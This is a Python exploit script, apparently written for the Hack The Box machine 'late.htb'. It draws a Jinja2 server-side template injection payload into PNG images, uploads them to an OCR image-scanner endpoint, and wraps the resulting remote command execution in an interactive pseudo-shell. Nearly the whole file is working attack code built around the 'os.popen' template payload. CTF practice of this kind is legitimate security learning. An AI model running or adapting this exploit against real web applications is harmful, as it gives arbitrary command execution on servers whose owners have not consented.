from PIL import Image, ImageDraw, ImageFont
import os
import requests
import argparse

# File 3/3 - This was the final test and pseudoshell once I found a working exploit with imguploader.py

# url of the ImageReader page we are attacking
url = "http://images.late.htb/scanner"
#url = "http://127.0.0.1:5000/scanner"
# prepend ssti text with this string of chars i.e:  aaa {{ 7*'7' }}  THIS SHOULD BE UNIQUE TO NOT FILTER ACCIDENTALLY FROM THE CMD
prepend="tesseractSux "
# prefix of the img files to save
pre="exp_"
# ext of the img files
ext=".png"
# Font file to use for the image  - consolai.ttf @ 12pt gave me 80% but still not very good.. only tested 10-28
fontfile="LiberationMono-Regular.ttf"
# THX Romain for the font help!!!!

# 96% Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 26
# 97% Trying font file DejaVuSansCondensed-BoldOblique.ttf size: 25
# 97% Trying font file Lato-BolBdItalic.ttf size: 28
# 97% Trying font file DejaVuSerifCondensed.ttf size: 16
# 97% Trying font file DejaVuSansCondensed-Bold.ttf size: 24
# 98% Trying font file DejaVuSerifCondensed.ttf size: 23
# 98% Trying font file DejaVuSerifCondensed-Bold.ttf size: 24

# Font size to use for the image
fontsize=32
# Save images? 0=no 1=yes
imgsave=1
# fixed width of img
imgwidth=2600
# height of img
imgheight=100
# image number to start with (if you are saving the images)
num=0
# minimum number of chars to consider a 'hit', i.e successfully pulled classes
hitminimum=120


# expstring = string that has full command execution, with !CMD! substituted for command
expstring = "{{ joiner.__init__.__globals__.os.popen('!CMD!').read() }}"
# 1 to keep asking for commands in a loop, creating an emulated shell
usecmdshell = 1
# command to run (blank if cmdshell = 1)
mycmd = ""

# global vars
hits=[]
hitcounter=0
# misc - do not modify!
cmdshell=1


def send(fname,num,txt):
    global hits
    global hitcounter
    chnum=0
    likeness=0
    #print("[.] sending file "+fname+" to "+url+" ..",)
    #print("from: "+txt+" len: "+str(len(txt)))
    file = {'file': open(fname, 'rb')}
    r=requests.post(url, files=file)
    code=str(r.status_code)
    resp=r.text.replace("\r\n","").replace("<p>","").replace("</p>","").replace("&gt;",">").replace("&lt;","<").replace("&#39;","'").replace("&#34;",'"').replace(prepend,"")
    print(resp)
    # do not check response for accuracy here we don't care.. already got it working efficiently by this point.
    if 1==2:
        if chnum<len(txt):
            # resp might be longer, and usually is..
            #print("compare: "+txt[chnum]+" to "+ch)
            if ch == txt[chnum]:
                # problem = one space early on and likeness is screwed, could be inaccurate, but most are towards the end..
                likeness+=1
        chnum+=1
        numscore=round((likeness/len(txt))*100)
        score=str(numscore)
        print(code+" "+score+"%\t"+resp)
        if (len(r.text)>hitminimum):
            hits.append("[!] HIT! "+str(num)+" : "+txt+" = Likely hit, "+str(len(r.text))+" chars")
            print(hits[hitcounter])
            hitcounter+=1
    return(1)

print("\n\n")
print("sstiexploit.py - crypticsilence 2022-05-08")

parser = argparse.ArgumentParser("simple_example")
#parser.add_argument("tfilename", help="File of SSTI strings to try injecting, one per line", type=str, required=False)
parser.add_argument('-v', '--version', action='version',
                    version='%(prog) 0.1c', help="Show program version number and exit.")
parser.add_argument("-hh", help="Extended help/information", required=False)
args = parser.parse_args()

if (args.hh):
    print("  (made for htb box late.htb) - Pseudoshell")
    print("  creates a .png file with text using PIL ImageDraw.Draw(), and uploads to a site via POST")
    print("  you should test with an alphabet.txt first, and make sure your font is returning the correct reply text!")
    print("  i.e something like : abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`0123456789~!@#$%^&*()_+[]\\{}|;':\",./<>?")
    print("  You can view images with 'eom img_0.png' if Eye of Mate image viewer, if installed")
    print("  Since this exploit is not a persistent shell, each command will be run from the same directory.")
    print("    i.e, in a cmdshell=1, to navigate to directories will need to be copied to next statement!")
    print("  Make your prepend string unique! Otherwise you may filter it inadvertantly if its a or aa etc")
print("\n\n")
#print("Err Score String")

cmdshell=1
if 1==1:
    while cmdshell:
        mycmd=input("CMD (or 'exit')> ")
        fullcmd=expstring.replace("!CMD!",mycmd.replace("'","\'").replace('"','\"').replace("\\","\\\\"))
        if mycmd.upper()=="EXIT":
            break
        if usecmdshell==0:
            cmdshell=0
        #print("Using font file "+fontfile+" size: "+str(fontsize))
        try:
            fnt = ImageFont.truetype(fontfile,fontsize)
        except:
            print("[!] Exception - Using fontfile: "+fontfile+" and fontsize: "+fontsize+" !")
            break
        txt=prepend+fullcmd
        if len(txt)>1:
            # create new image for each ssti attempt- which must be a single line!
            try:
                print("[ Tried:\t"+txt.strip("]\n\n"))
                image = Image.new(mode = "RGB", size = (imgwidth,imgheight), color = "black")
                draw = ImageDraw.Draw(image)
                draw.text((10,10), txt, font=fnt, fill=(255,255,0))
                filename = pre+str(num)+ext
            except:
                print("[!] Exception - w/ ImageDraw.Draw() : "+num)
                break
            try:
                image.save(filename)
            except:
                print("[!] Exception - image.save("+filename+")")
                break
            try:
                score=send(filename,num,txt)
            except:
                print("[!] Exception - send() filename: "+filename+" num: "+str(num)+" txt: '"+txt+"'")
                break
            num+=1

if not imgsave:
    os.system("rm -f "+pre+"*.png")
else:
    print("[o] Saved "+str(num)+" png images")

